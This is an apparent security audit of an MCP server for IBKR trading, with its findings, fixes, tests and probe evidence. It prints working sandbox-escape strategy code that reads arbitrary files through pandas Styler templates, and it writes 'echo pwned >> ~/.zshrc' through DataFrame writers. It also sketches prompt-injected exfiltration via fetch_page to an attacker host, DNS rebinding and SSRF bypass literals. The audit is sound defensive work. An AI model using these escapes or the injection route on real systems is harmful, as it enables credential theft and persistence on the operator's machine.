# Security Architecture Audit — 2026-09-13

**Scope.** Whether `ibkr_core_mcp` has *enforceable* security boundaries, and whether a future
change — lint-clean, fully typed, tests green, possibly written by a coding agent — could
violate one silently. Not a code-quality review: ruff, `ruff format`, strict mypy, pytest and
the Ruff `S` rules were taken as the working baseline.

**Method.** Read-only trace of every MCP tool to its sinks, then live probes from a scratchpad
against the installed `.venv` (Python 3.11.16, mcp 1.29.0, RestrictedPython 8.4, pandas with
jinja2 present via crawl4ai 0.9.2). Findings were graded only on demonstrated paths. The
remediation was then implemented test-first on branch `security-architecture-2026-09`; every
fix is paired with the test that failed before it, and the red/green record is in § Evidence.

**Result.** Three confirmed issues, two demonstrated by execution (A1, A2) and one code-confirmed
(A3); nine architectural weaknesses where a property held by convention only. All P0–P2 items
are implemented. The repository now has a `tests/security/` suite (9 files, 137 tests, `security`
marker) that reads the source for the structural properties and uses canary files for the
behavioural ones, plus two CI gates (`pip-audit`, `gitleaks`) the code gates could not provide.

Baseline before: 1,144 tests (1,051 unit, 93 integration). After: 1,281 (1,188 unit, 93
integration); ruff, `ruff format`, mypy strict clean on both.

---

## Remediation status

| # | Finding | Severity | Status | Commit | Test that failed first |
|---|---|---|---|---|---|
| A1 | Sandbox reads any file into the error channel (`Styler.from_custom_template`) | High | **Fixed** | `c4b4ba8` | `test_sandbox_boundary.py::test_strategy_cannot_read_a_file_through_the_styler_template_loader` |
| A2 | Sandbox writes attacker-chosen bytes to any path (`to_csv` et al.) | High | **Fixed** | `c4b4ba8` | `…::test_strategy_cannot_write_a_file_through_a_dataframe_writer[5 writers]`, `…[7 string/class forms]`, `…clipboard` |
| A3 | SSE transport without Host/Origin validation (DNS rebinding) | High (SSE) / Medium | **Fixed** | `2a4b122` | `test_transport_security.py::test_a_foreign_host_header_is_rejected…`, `…foreign_origin…` |
| B1 | Order boundary conventional | — | **Enforced** | `80ad561` | structural; probe tests prove the checker fires |
| B2 | Preview one literal from execution | — | **Enforced** | `80ad561` | structural + mock-client reach test |
| B3 | No capability declarations | — | **Fixed** | `c44d18a` | `test_tool_capabilities.py` (ImportError before; honesty check reclassified `verify_flex_import`) |
| B4 | Sandbox exposure not frozen | — | **Enforced** | `c4b4ba8` | `…::test_sandbox_globals_are_exactly_the_documented_set` and the two namespace tests |
| B5 | Three error channels bypass redaction; Flex token in `requests` text | — | **Fixed** | `f35f960` | `test_error_redaction.py` (ModuleNotFoundError before; structural probe) |
| B6 | Unit tests load the real `.env` | — | **Fixed** | `8c2594c` | `test_no_live_io.py::test_constructing_a_config_does_not_load_the_repository_dotenv`, `…from_env_sees_only_what_the_test_set` |
| B7 | `100.64.0.0/10` unblocked; octal divergence; `search_site` single-layer | — | **Fixed / documented** | `a023e03` | `test_ssrf_boundary.py` — 6 rows red |
| B8 | New subprocess sites invisible to lint | — | **Enforced** | `80ad561` | structural |
| B9 | Body shown ≠ body sent (TOCTOU) | Low | **Fixed** | `c603d17` | `test_order_write_boundary.py::test_a_body_mutated_after_the_dialog_is_not_the_body_sent[2]` |
| C | Import-time socket block; `read_resource` redaction; `to_clipboard` | — | **Done** | `3bc7d69`; `f35f960`; `c4b4ba8` | covered above |
| C | Flex scripts printing the token | — | **Withdrawn** | — | The scripts never call the Flex Web Service (they read Drive); the only Flex-token channel was the toolkit's, now redacted |
| P2 | `pip-audit` + `gitleaks` gates | — | **Added** | `3bc7d69` | `.github/workflows/ci.yml` jobs `dependency-audit`, `secret-scan` |
| P3 | Coverage on security modules | — | **Deferred** | — | Non-blocking report first; not started |

---

## Phase 1 — Capability and trust-boundary map

### Entry points

| Entry | Where | Trust of input |
|---|---|---|
| 44 toolkit tools | `claude_tools.TOOL_DEFINITIONS`, dispatched by `ClaudeToolkit.execute()` | Model-supplied (untrusted) |
| 2 server-local tools (`add_price_alert`, `get_price_alerts`) | `mcp_server._dispatch` | Model-supplied |
| 4 resources (`ibkr://accounts`, `positions/current`, `trades/recent`, `pnl/live`) | `mcp_server.handle_read_resource` | Model-supplied URI |
| SSE HTTP transport (`--transport sse`) | `mcp_server._run_sse`, uvicorn on 127.0.0.1:5174 | Any process or browser tab on the machine |
| Web content from `fetch_page`, `crawl_site`, `search_site`, `firecrawl_search` | returned into the model context | Attacker-controlled (prompt injection vector) |
| IBKR gateway responses | `IBKRClient._get/_post`, `IBKRWebSocket` | Semi-trusted (localhost); reply messages are rendered on Gate 2 |
| Flex Web Service XML | `flex_query.py` (defusedxml) | Semi-trusted |
| Host app (claudia_ui) | calls `IBKRClient.place_order_and_confirm` etc. directly | Trusted in-process code |
| Environment / `.env` | `Config.from_env()` | Operator |

### Privileged sinks

| Sink | Function(s) | Category |
|---|---|---|
| IBKR order endpoints (`/orders`, `/order/{id}`, `/iserver/reply/{id}`) | `client.place_order`, `modify_order`, `cancel_order`, `reply_order`, `_resolve_one_reply`, `*_and_confirm` | ORDER_EXECUTION / MODIFICATION / CANCELLATION |
| IBKR whatif | `client.get_order_preview` | ORDER_PREVIEW |
| IBKR alerts, watchlists, FYI, account switch, logout | `create_alert`, `delete_alert`, `activate_alert`, `create_watchlist`, `delete_watchlist`, `switch_account`, `logout`, … | ACCOUNT_STATE (ungated) |
| Google Drive read/write/delete | `cache.GDriveCache`, `web_scraper.WebDocsStore` | GOOGLE_DRIVE, OAUTH |
| SQLite | `store.SQLiteStore`, `flex_store` | DATABASE |
| Local filesystem | `_import_flex_file` (allowlisted), OAuth token persist, crawl4ai profile dirs, backtest child (A1/A2) | FILESYSTEM |
| Browser cookie store | `auth.BrowserCookieAuth` (client construction, `_prime_pnl_subscription`, `_stream_loop`) | BROWSER_COOKIES |
| Local Chromium via Playwright | `Crawl4AIScraper.scrape`, `crawl_site` | WEB_FETCH, NETWORK |
| httpx seeder | `search_site_detailed` (crawl4ai `AsyncUrlSeeder`) | WEB_FETCH, NETWORK |
| Firecrawl API | `web_scraper.FirecrawlClient` | NETWORK (remote fetch) |
| Subprocess | `order_confirm` (python, osascript), `gateway/manager.py` (docker, open), `backtest` (multiprocessing spawn), `scripts/audit_flex_xml.py` (ruff) | SUBPROCESS, DOCKER |
| RestrictedPython exec | `backtest._execute_in_subprocess` | SANDBOX_EXECUTION |
| Touch ID / dialogs | `human_auth.require_touch_id`, `order_confirm.*` | Human gates |

### Tool classification (SOURCE → VALIDATION → SERVICE → SINK)

The `capabilities` set each tool now declares (`claude_tools.CAPABILITIES`) is the machine form of
this table; `tests/security/test_tool_capabilities.py` checks the declaration against the sinks a
handler's source touches.

| Tools | Validation at boundary | Reaches | Declared |
|---|---|---|---|
| get_account_summary, get_positions, get_ledger, get_allocation, get_pa_*, get_live_orders, diagnose_orders, get_order_status, get_alerts, get_watchlists, get_notifications, get_trading_schedule, search_contract, get_futures, get_market_snapshot, get_contract_info, get_option_chain, run_scanner, check_cache, list_cache, check_flex_coverage, get_price_alerts | account ids from IBKR; `order_id`/`alert_id` regex in client; symbols go to query params | IBKR GET/POST, Drive/SQLite reads | READ_ONLY |
| get_pnl | as above | + browser cookies and a WebSocket touch (`_prime_pnl_subscription`) | READ_ONLY, LOCAL_IO |
| preview_order | action/type/qty allowlists | `get_order_preview` → `/orders/whatif` | ORDER_PREVIEW |
| create_price_alert, modify_price_alert, delete_alert, activate_alert | `alert_id` regex in client | `create_alert` / `delete_alert` / `activate_alert` | **ACCOUNT_STATE** |
| fetch_market_data, delete_cache | `_validate_cache_inputs` regexes | Drive upload / delete | GOOGLE_DRIVE |
| get_trades | — | live path upserts SQLite | DATABASE |
| sync_flex_trades | account regex | Flex Web Service, Drive `account_data/`, SQLite | NETWORK, GOOGLE_DRIVE, DATABASE |
| sync_flex_archive, verify_flex_import | — | Drive read, SQLite write (manifest) | DATABASE |
| import_flex_file | path must resolve under `~/.ibkr_core` | local read, SQLite write | LOCAL_IO, DATABASE |
| run_backtest | code length, `compile_restricted`, **attribute allowlist** | spawn child, `exec`, SQLite | SANDBOX_EXECUTION, DATABASE |
| add_indicators, get_analytics, generate_pinescript | — | pandas | COMPUTE |
| fetch_page | `_validate_public_url` + Playwright route guard | local Chromium, saved profiles | WEB_FETCH, LOCAL_IO |
| crawl_site | same | + Drive save | WEB_FETCH, LOCAL_IO, GOOGLE_DRIVE |
| search_site | `_validate_public_url` (layer 1 only) | httpx seeder | WEB_FETCH |
| firecrawl_search | key presence | Firecrawl; optional Drive save | NETWORK, GOOGLE_DRIVE |
| add_price_alert | casts | SQLite | DATABASE |

SECURITY.md described the surface as "42 read-only tools"; the registry held 46, eight of which
mutate state outside the machine. Corrected in the same branch.

---

## Phase 2 — Invariant results

| # | Invariant | Before | After |
|---|---|---|---|
| 1 | Order execution boundary | Conventional: gates inside four methods; `_post`/`_session` and the endpoint paths callable from anywhere; nothing in CI would notice a new caller | AST-enforced (`test_order_write_boundary.py`): endpoints built only in the gated methods, gate before network, model layer free of order-write names, authorization minted once |
| 2 | Preview never executes | True, one literal apart; no test pinned `/whatif` | Pinned (`test_preview_is_not_execution.py`) |
| 3 | MCP inputs validated | Mostly true; identifiers regex-validated in `client.py`; gap: `run_backtest` code | Gap closed by the allowlist |
| 4 | SSRF boundary | Strong on browser paths; `100.64.0.0/10` open; octal divergence caught only by layer 2; `search_site` layer-1-only | Ranges and literal parsing fixed; 20-row table; `search_site` documented |
| 5 | RestrictedPython boundary | **Broken**: arbitrary read and write demonstrated | Allowlist; canary tests; frozen exposure |
| 6 | Secrets cannot leak | Mostly true; Flex token in `requests` exception text; three channels bypass `_safe_error` | One `redact_error`; structural test |
| 7 | Unit tests never reach live services | Sockets blocked per test; real `.env` loaded by `Config()` | Session-wide socket block; `.env` stubbed; secrets removed |
| 8 | Subprocess constrained | Conventional; S603/S607 ignored | Module allowlist + no `shell=True`, AST |
| 9 | Privileged tools identifiable | No | `capabilities` on all 46; `ORDER_EXECUTION` set asserted empty |
| 10 | Fail closed | True for gates; sandbox error channel open | Error channel one bounded line |

---

## Phase 5 — Findings (as found)

### A. Confirmed vulnerabilities

#### A1 — Backtest sandbox reads arbitrary files and returns the contents to the model

- **Severity:** High. Critical combined with A3 or with prompt injection via the web tools,
  because the model can then exfiltrate through `fetch_page(https://attacker/?t=…)`.
- **Confidence:** Confirmed by execution.
- **Invariant violated:** 5, 6.
- **Code path:** MCP `run_backtest` → `ClaudeToolkit._run_backtest` → `backtest.run_backtest` →
  child `_execute_in_subprocess` → `_sandboxed_getattr(df, "style")` allowed (only `eval`/`query`
  denied) → `Styler.from_custom_template(searchpath, html_table)` builds a jinja2
  `FileSystemLoader` on any directory → `cls(df).to_html()` renders any file → `raise
  ValueError(html)` → `conn.send(("runtime_error", …))` → `BacktestRuntimeError` →
  `_run_backtest` returns `f"Backtest failed: {exc}"` verbatim (deliberately bypassing
  `_safe_error` so the model can fix its own code).
- **Demonstration:** three lines of strategy code read a canary file; the full contents came
  back in the tool result (§ Evidence, probe 1). The same works for `~/.ibkr_core/token.json`.
- **Why controls failed:** `_SAFE_PD` strips `pd.read_*`, but `df` carries the whole DataFrame
  API; the denylist had two names. SECURITY.md's residual-risk paragraph said the sandbox
  "cannot access credentials, read arbitrary paths" — false. `test_no_file_access` only checked
  that `open()` was missing.
- **Remediation:** attribute allowlist for pandas/numpy objects and classes in
  `_sandboxed_getattr`; string-function names checked against the same list; error channel one
  line, 300 chars. `build_sandbox()` extracted so the namespace is a testable value.
- **Regression test:** canary read/write/clipboard/open/import strategies; frozen exposure sets.

#### A2 — Backtest sandbox writes attacker-chosen bytes to any path as the operator

- **Severity:** High (persistence: `~/.zshrc`, `~/Library/LaunchAgents/*.plist`,
  `~/.ssh/authorized_keys`).
- **Confidence:** Confirmed by execution.
- **Code path:** as A1, ending in `pd.DataFrame({"a": [payload]}).to_csv(path, index=False,
  header=False)`. The spawn child runs with the operator's uid and no OS-level restriction.
  Also reachable by name: `df.apply("to_csv", path_or_buf=path)`, `df.agg(...)`,
  `df.transform(...)`, `df["close"].apply("to_csv", args=(path,))`, and
  `df.pipe(pd.DataFrame.to_csv, path)` — each wrote a file (probe 3).
- **Demonstration:** wrote a file containing exactly `echo pwned >> ~/.zshrc` from strategy
  code; `run_backtest` reported success (probe 1).
- **Remediation / test:** shared with A1.

#### A3 — SSE transport accepts DNS-rebinding and cross-origin requests

- **Severity:** High when `--transport sse` is used; Medium overall (default transport is stdio).
- **Confidence:** High on mechanism (SDK source read); attack not executed live.
- **Code path:** `mcp_server._run_sse` constructed `SseServerTransport("/messages/")` with no
  `security_settings`. In mcp 1.29.0, `TransportSecurityMiddleware.__init__` substitutes
  `TransportSecuritySettings(enable_dns_rebinding_protection=False)` "for backwards
  compatibility", so Host and Origin were never validated. uvicorn binds 127.0.0.1, which stops
  the LAN but not the operator's own browser.
- **Impact:** all 46 tools, including `run_backtest` (A1/A2), the four IBKR alert mutations,
  `delete_cache` and `crawl_site`, from an unattended browser tab.
- **Remediation:** `build_sse_app` passes `TransportSecuritySettings(enable_dns_rebinding_protection=True,
  allowed_hosts=[loopback:*], allowed_origins=[http://loopback:*])`.
- **Regression test:** foreign `Host` → 421, foreign `Origin` → 403, loopback → reaches the
  session layer (404 on an unknown session id).

### B. Architectural weaknesses

| # | Desired invariant | Enforcement before | Failure mode | Enforcement now |
|---|---|---|---|---|
| B1 | Exactly one order boundary; no toolkit/MCP handler references it | Docstrings, CLAUDE.md, human grep | A new tool calls `client.cancel_order` (gates fire, but the model now triggers Touch ID prompts — fatigue) or `client._post("/iserver/account/…/orders")` (no gates). The `authorization=` kwarg lets in-process code skip Gate 1; a helper minting `OrderWriteAuthorization` elsewhere would be invisible | AST: endpoint templates only in `{place_order, modify_order, cancel_order, reply_order, _resolve_one_reply}`; gate before first network call; model layer free of order-write names, `_post`, `_session`, `OrderWriteAuthorization`; authorization constructed only in `_authorize_order_write` |
| B2 | Preview cannot become execution | `test_get_order_preview_has_no_gate`; nothing pinned the endpoint | A shared submit helper or a dropped `/whatif` passed every test | `_post` path asserted; `whatif` literal once, in `get_order_preview`; `preview_order` touches only `get_order_preview` |
| B3 | Every tool declares capabilities; `ORDER_EXECUTION` set empty | SECURITY.md prose (wrong) | Side-effecting tool added without a decision on model reachability | `capabilities` on 46 defs; declaration, emptiness, READ_ONLY exclusivity and source-honesty tests |
| B4 | Sandbox exposure is a frozen allowlist | Two-name denylist | Any new object exposed to strategies | `build_sandbox()` keys and safe-namespace members pinned |
| B5 | All model-facing error text passes one redaction function | `_safe_error`, bypassed by `_run_backtest`, `handle_read_resource` (raw gateway body preview), web handlers | A handler copies the `fetch_page` pattern for a Flex call and the token (in `requests` exception text — probed) reaches the model | `redact_error`; structural test over every `except … as` in the model layer |
| B6 | Unit tests never see real credentials | pytest-socket only | `Config()` default factory loads the repo's `.env`; a test asserting on `os.environ` or calling `from_env()` uses real values | `load_dotenv` stubbed, secret names removed, socket block from session start |
| B7 | SSRF guard blocks every non-public destination | Layer 1 everywhere; layer 2 only on Playwright paths | `100.64.0.0/10` reachable (Tailscale); octal literal resolved as public at layer 1; `search_site` has no layer 2 | `inet_aton` parsing before DNS; shared range and mapped-IPv4 blocked; `search_site` documented |
| B8 | Only named modules spawn; never a shell | Ruff S with S603/S607 ignored | New `subprocess.run` in a handler passes lint | AST module allowlist; no `shell=True` |
| B9 | Gate 2 renders what is sent | Body built after the dialog | Caller mutation between dialog and POST | `order = dict(order)` at entry; test mutates the caller's dict from inside the dialog |

### C. Defense-in-depth

- `to_clipboard` denied (subsumed by the allowlist). Done.
- `handle_read_resource` through `redact_error`. Done.
- Socket block armed in `pytest_configure`, fixture opens a window only for entitled tests. Done.
- Explicit `0.0.0.0/8`, `100.64.0.0/10`, unspecified and mapped-IPv4 handling. Done.
- Flex scripts: withdrawn — they never call the Flex Web Service.

### D. Rejected concerns (investigated, adequately mitigated)

| Concern | Evidence |
|---|---|
| Path traversal through model-supplied `order_id`/`alert_id`/`account_id`/`reply_id` | Regexes at `client.py` (`_ACCOUNT_ID_RE`, `_ORDER_ID_RE`, `_REPLY_ID_RE`) applied in `get_order_status`, `get_alert`, `delete_alert`, `activate_alert`, `create_alert`, all order writes and `get_order_preview`. conids come from `_resolve_snapshot_conid`, never the model. |
| SQL injection in `store.py` / `flex_store.py` | All values bound; dynamic fragments are constants (`_TRADE_DATE_SQL`, hard-coded migration columns) or allowlisted (`_ALLOWED_TIME_COLS`); flex column names come from the generated schema and `flex_import` refuses unknown attributes. |
| Google Drive query injection | `_validate_cache_inputs` regexes exclude quotes; `_slugify` emits only `[a-z0-9-]`. |
| Cookie header injection | CR/LF stripped from cookie names and values (`auth.py`). |
| Browser name → `getattr` on `browser_cookie3` | `_ALLOWED_BROWSERS` enforced in the constructor; `IBKR_AUTH_BROWSER` passes through it. |
| XML entity attacks in Flex XML | `defusedxml.ElementTree` in both Flex modules. |
| Session cookie sent to a remote host | `IBKRClient.__init__` and `IBKRWebSocket.connect` refuse non-loopback hosts before any credential is attached; `verify=False` is therefore pinned to loopback. |
| Profile directory traversal | `_safe_domain` rejects `..`, `/`, `\`. |
| `import_flex_file` arbitrary read | `resolve()` then `is_relative_to(~/.ibkr_core)`. |
| SSRF via userinfo tricks, alternate schemes, mapped IPv6, encoded literals | Probed: `urlparse` yields the true host for `user:pw@`, `127.0.0.1@example.com`, `#@`; non-http blocked; mapped, decimal, hex, `localhost.`, `0`, link-local, ULA blocked. Redirects and subresources re-checked per request by the Playwright guard, installed by both `scrape` and `crawl_site`. |
| Unit tests reaching IBKR, Google, Anthropic or the internet | `_no_real_io` with pytest-socket; probe confirmed `getaddrinfo` and `create_connection` raise `SocketBlockedError`; DNS exemptions pinned to existing test names by `test_conftest_hygiene.py`; all seven `*_live.py` files `integration`-marked. |
| Secrets in reprs, logs, git | `anthropic_api_key`, `flex_token`, `firecrawl_api_key` are `repr=False`; `TokenAuth.__repr__` redacted; `streaming.py` never logs the cookie; `git grep` for `sk-ant-`, `fc-`, `AIza`, `ya29.` found only placeholder fixtures; `.env` gitignored and mode 0600; token file 0600. |
| Gate 2 fail-open | AppKit: anything but stdout `CONFIRMED` raises; osascript: non-zero, empty, `timeout`, or the abandon label raises; tkinter: only the confirm button sets the flag; no GUI raises. Timeout aborts the modal. The macOS 26 / Python 3.14 auto-confirm noted in project memory is an environment defect avoided by the 3.11 pin. |
| Gate 1 fail-open | Missing framework, `canEvaluatePolicy` false, timeout, `ok` false all raise; non-macOS cannot write orders. `OrderWriteAuthorization` is frame-local, scope-hashed, TTL-bound, checked at the write and every reply. |
| AppleScript injection via IBKR reply text | HTML-stripped, then `_as_str` escapes backslash and quote into a quoted literal; a raw newline fails to compile and raises. Not demonstrated exploitable. |
| Docker CLI argument injection | Arguments are class constants and an `int` port; loopback publish asserted by an existing test. |
| `ClaudeToolkit` calling Anthropic | No `anthropic` import anywhere in the package. |

---

## Priority table (as assigned) and disposition

| Priority | Finding | Risk | Effort | Disposition |
|---|---|---|---|---|
| P0 | A1 + A2 sandbox file read/write | Credential theft, persistence, no human gate | ~1 day | Done, `c4b4ba8` |
| P1 | A3 SSE rebinding protection | Any web page drives all 46 tools when SSE is on | 1 h | Done, `2a4b122` |
| P1 | B1 order-boundary AST tests | Silent second execution path | ½ day | Done, `80ad561` |
| P1 | B3 capability registry | "Which tools mutate state?" has no machine answer | ½ day | Done, `c44d18a` |
| P1 | B2 preview/execute pinning | One literal from live execution | 1 h | Done, `80ad561` |
| P2 | B5 single redaction function | Token / API bodies reaching the model | ½ day | Done, `f35f960` |
| P2 | B6 tests load real `.env` | Credential exposure in tests | 1 h | Done, `8c2594c` |
| P2 | B7 CGNAT range, literal parsing, `search_site` note | Tailnet reach; resolver divergence | 1 h | Done, `a023e03` |
| P2 | B8 subprocess allowlist | New spawn site invisible | 1 h | Done, `80ad561` |
| P2 | pip-audit + gitleaks | Vulnerable floating deps; committed secrets | 2 h | Done, `3bc7d69` |
| P3 | B9 dict copy; read_resource redaction; import-time socket block | Low today | Trivial | Done |
| P3 | Coverage on security modules | Visibility | 2 h | Deferred |

---

## Phase 3 — Supply chain and CI (decisions)

**pip-audit — added** as the `dependency-audit` job: installs `[dev,server,scraper]` (the audit is
of what a user installs; the scraper extra pulls the largest tree — crawl4ai, playwright, nltk
— and is where findings surfaced locally: nltk 3.10.0 with 19 advisories fixed in 3.10.3,
tornado 6.5.7 fixed in 6.5.8, and pip itself), upgrades pip first, then runs `pip-audit --strict
--desc --vulnerability-service osv` with `--ignore-vuln` flags read from
`security/pip-audit-ignores.txt`. A finding with a fixed release is never ignored — the floor
is bumped. Runs per push/PR and weekly on a schedule, because the tree floats without commits.
Blocking. `pip-audit` joins the `dev` extra for local runs.

**gitleaks — added** as the `secret-scan` job (`gitleaks/gitleaks-action@v2`, `fetch-depth: 0`,
config `.gitleaks.toml`: default rules plus `fc-…` and `sk-ant-…` shapes; allowlist for the two
placeholder-credential test files). A one-time full-history scan is a local step
(`gitleaks git --redact`), not CI. Blocking.

**CodeQL / Semgrep — not added by this audit, and CodeQL turns out to be already on.** The
uncovered classes were exactly the architectural ones, each now a 30-line stdlib `ast` test with
zero noise and no new tool. Discovered at push time: GitHub's *default* CodeQL setup has been
configured on the repository since 2026-07-21 (languages `python` and `actions`, default query
suite, weekly), running as a dynamic workflow outside `ci.yml`; it reported **0 open alerts** on
2026-09-13. It stays — it costs nothing and is not a merge gate — and Semgrep is still not
added.

**Coverage — deferred.** Named-module 100 % branch coverage as a non-blocking report first:
`human_auth.py`, `order_confirm.py` (minus tkinter widget lines), the order section of
`client.py`, `local_browser.is_private_host` / `_reject_private_requests` / `_safe_domain`,
`backtest._sandboxed_getattr` / `_execute_in_subprocess`, `claude_tools._safe_error` /
`_validate_public_url` / `execute`, `mcp_server._dispatch`, `auth.py`, `gdrive_auth.py`,
`redaction.py`.

**CI shape now:** ruff check → ruff format → mypy strict → pytest unit (which includes
`tests/security/`) on 3.11 and 3.12; `dependency-audit` and `secret-scan` as parallel jobs. No
separate "security" step — the invariant tests are ordinary tests, so the pre-push hook already
runs them, and `pytest -m security` runs them alone in ~10 s.

---

## Security constitution

The properties CI now makes impossible to violate silently:

1. **No order reaches IBKR except through the four gated `IBKRClient` methods**, and no toolkit
   or MCP handler references them or their endpoints.
2. **Preview is not execution:** the whatif path is the only order path callable without gates,
   and the only one the model can reach.
3. **Every model-callable tool declares its capabilities**, and the set declaring
   `ORDER_EXECUTION` is empty.
4. **Strategy code cannot read or write the filesystem, spawn processes, or reach the network**;
   what it can touch is a frozen, tested allowlist.
5. **Every externally derived URL is checked before the fetch and re-checked on every request
   the browser makes**; the blocked address set is a tested table.
6. **Error text that reaches the model or a log passes one redaction function**; Flex tokens,
   Bearer keys and cookies never appear in it.
7. **Unit tests cannot open sockets, resolve names, or see the operator's credentials.**
8. **Processes are spawned only from three named modules, never through a shell, never with
   model-derived arguments.**
9. **Every path-interpolated identifier passes its regex before it reaches a URL.**
10. **The HTTP transport validates `Host` and `Origin`**, so a browser tab cannot become an MCP
    client.

---

## Evidence

### Probe 1 — sandbox read, write, clipboard (before the fix)

Run from `scratchpad/probe_sandbox.py` against `backtest.run_backtest` as of `b028518`. `S` is the
scratchpad directory; `canary.txt` contained `SECRET-CANARY-42`.

```
[write] OK -> num_trades=0
file written: True 'echo pwned >> ~/.zshrc\n'
[read-jinja] BacktestRuntimeError: Strategy runtime error: ValueError: <style type="text/css">
</style>
SECRET-CANARY-42
[apply-dunder] BacktestRuntimeError: Strategy runtime error: TypeError: NDFrame.__finalize__() missing 1 required positional argument: 'other'
[clipboard] OK -> num_trades=0
[open] BacktestRuntimeError: Strategy runtime error: NameError: name 'open' is not defined
[import] BacktestRuntimeError: Strategy runtime error: ImportError: __import__ not found
```

Strategy code for the read:

```python
cls = df.style.from_custom_template("<dir>", "canary.txt")
raise ValueError(cls(df).to_html())
```

### Probe 2/3 — writers reachable by name (before the fix)

```
[series-apply] OK            exists: True     df['close'].apply('to_csv', args=(p,))
[pipe] OK                    exists: True     df.pipe(pd.DataFrame.to_csv, p)
[agg-kw] … AttributeError    exists: True     df.agg('to_csv', path_or_buf=p)     (error raised AFTER the write)
[transform-kw] … ValueError  exists: True     df.transform('to_csv', path_or_buf=p)
[series-agg] … Assertion     exists: True     df['close'].agg('to_csv', path_or_buf=p)
[series-transform] …         exists: True     df['close'].transform('to_csv', path_or_buf=p)
[df-apply-kw] …              exists: True     df.apply('to_csv', path_or_buf=p)
```

### Probe 8 — after the allowlist (critical re-check before merge, 2026-09-13)

Fourteen further forms were tried against the fixed sandbox: named aggregation on a frame
(`df.agg(out=("close", "to_csv"))`), on a groupby, dict-of-lists aggregation, writers reached
through `df.index.to_series()`, `df.dtypes`, a numpy scalar (`.max().tofile`), a resampled
frame, the `.str` accessor, a rolling result, and `transform({"close": "to_csv"})`. All blocked
with `'to_csv' is not available to strategy code`, no file written. One form got through by
name only: `df["close"].agg(out="to_csv")` — pandas named aggregation on a Series treats every
keyword as a function name, and the guard checked only tuple-valued keywords. No path can travel
that way (the writer ran with no arguments and returned CSV text), so nothing was written; the
guard now checks every keyword value of `agg`/`aggregate`, and
`test_a_named_aggregation_keyword_faces_the_allowlist_too` failed before that change. The
stale editable install (`build/__editable__…` snapshot missing `redaction.py`) that first made
this probe fail is an environment note: after adding a module, re-run `pip install -e .`.

### Probe 4 — SSE transport default

```python
>>> inspect.getsource(mcp.server.transport_security.TransportSecurityMiddleware.__init__)
    def __init__(self, settings: TransportSecuritySettings | None = None):
        # If not specified, disable DNS rebinding protection by default
        # for backwards compatibility
        self.settings = settings or TransportSecuritySettings(enable_dns_rebinding_protection=False)
```

`mcp_server.py` (before): `sse_transport = SseServerTransport("/messages/")`.

### Probe 5 — SSRF guard edge cases (before the fix)

```
  ::ffff:127.0.0.1 -> blocked=True        0177.0.0.1 -> blocked=False   (resolver: 177.0.0.1)
             127.1 -> blocked=True        100.64.0.1 -> blocked=False
        2130706433 -> blocked=True       192.0.0.192 -> blocked=True
        0x7f000001 -> blocked=True                 0 -> blocked=True
        localhost. -> blocked=True           fe80::1 -> blocked=True
               ::1 -> blocked=True           fd00::1 -> blocked=True
```

`socket.getaddrinfo("0177.0.0.1")` → `['177.0.0.1']`; `socket.inet_aton("0177.0.0.1")` → 127.0.0.1.

### Probe 6 — Flex token in a `requests` exception

```python
>>> requests.get("https://flex-host.invalid/…/SendRequest", params={"t": "SECRET-FLEX-TOKEN", …}, timeout=2)
requests.RequestException: … "SECRET-FLEX-TOKEN" in str(e) -> True
```

### Probe 7 — unit-test environment

```
env keys pulled in by constructing Config(...) in a unit-test style:
['FIRECRAWL_API_KEY', 'GDRIVE_CREDENTIALS_FILE', 'GDRIVE_TOKEN_FILE', 'GDRIVE_WEB_DOCS_FOLDER_ID']
```

pytest-socket under `disable_socket(allow_unix_socket=True)`: `getaddrinfo` → `SocketBlockedError`,
`create_connection` → `SocketBlockedError`.

### Red → green record (test-first, per item)

| Item | Red run | Green run |
|---|---|---|
| A1/A2/B4 sandbox | `15 failed, 6 passed` (`test_sandbox_boundary.py`, after `build_sandbox` extraction) | `21 passed`; `tests/test_backtest.py` + toolkit backtest tests `59 passed` |
| A3 transport | `2 failed, 3 passed` (foreign Host/Origin passed through to a 404) | `5 passed`; `tests/test_mcp_server.py` unchanged `21 passed` |
| B1/B2/B8 structural | one guard-on-guard failure (`^` anchor in the reply pattern missed `f"{self._base}/iserver/reply/{id}"`) | `18 passed` |
| B3 capabilities | `ImportError: cannot import name 'CAPABILITIES'` | `84 passed` (with `test_tool_descriptions.py`, `test_mcp_server.py`) |
| B7 SSRF | `6 failed` (`localhost.`, `0`, `100.64.0.1`, `100.127.255.254`, `2130706433`, `0x7f000001` — the last four because layer 1 reached DNS, which the suite blocks) | all rows pass, no DNS |
| B6 env isolation | `2 failed` (`Config()` loaded the real `.env`) | `5 passed` |
| B9 TOCTOU | `2 failed` (posted quantity 999, shown 1) | `2 passed` |
| B5 redaction | `ModuleNotFoundError: ibkr_core_mcp.redaction` | `12 passed` |
| Whole suite | 1,051 unit before | **1,188 unit passed**, 93 integration deselected; ruff, `ruff format`, mypy strict clean |

### First CI run of the new gates (run 34772667943, push of `b97f2ec`)

| Job | Result |
|---|---|
| Python 3.11 / 3.12 (ruff, format, mypy, pytest incl. `tests/security/`) | success |
| Secret scan (gitleaks) | success (annotation only: the action targets Node 20) |
| Dependency audit (pip-audit) | **failure** — `nltk 3.10.3  PYSEC-2026-3740  (no fix version)`: model-artifact path traversal, transitive via crawl4ai, APIs never called here |

That failure is the gate working as designed: a finding with **no fixed release** is the one
case the policy sends to `security/pip-audit-ignores.txt`, with the reason and a re-check date
(2026-10-13). The entry was added in the follow-up commit; nothing else was reported, so the
tree resolved by CI (fresh pip, `[dev,server,scraper]`) is otherwise clean. Note for the record:
the first read of this run mis-reported it green because `gh run watch … | tail` returned
`tail`'s exit status; the job list is the authority.

### Local pip-audit (this machine's venv, 2026-09-13)

`Found 56 known vulnerabilities in 6 packages`: aiohttp 3.14.1 → 3.14.3, cryptography 49.0.0 →
50.0.0, h2 4.3.0 → 4.4.1, nltk 3.10.0 → 3.10.3, pip 26.1.2 → 26.2.0, tornado 6.5.7 → 6.5.8 — every
one transitive (the `scraper` extra or the tool chain) and every one with a fixed release, so
none belongs in the ignore file: the CI job resolves fresh and upgrades pip first. This is what
the gate exists to see — the dev venv had drifted a version behind six fixes with no commit
touching any of them.

---

## Rejected or deferred recommendations

- Repo-wide coverage threshold: meaningless for security; use the named set above when started.
- Upper bounds on dependencies for security reasons: no; pip-audit plus floor bumps.
- CodeQL / Semgrep: not now (reasons in Phase 3).
- Relocating the gates out of `IBKRClient`: no; the innermost-call-site design is right, and
  B1 makes it observable rather than moving it.
- An OS-level sandbox (`sandbox-exec`) for the backtest child: the next layer if the allowlist
  ever proves insufficient; not started.
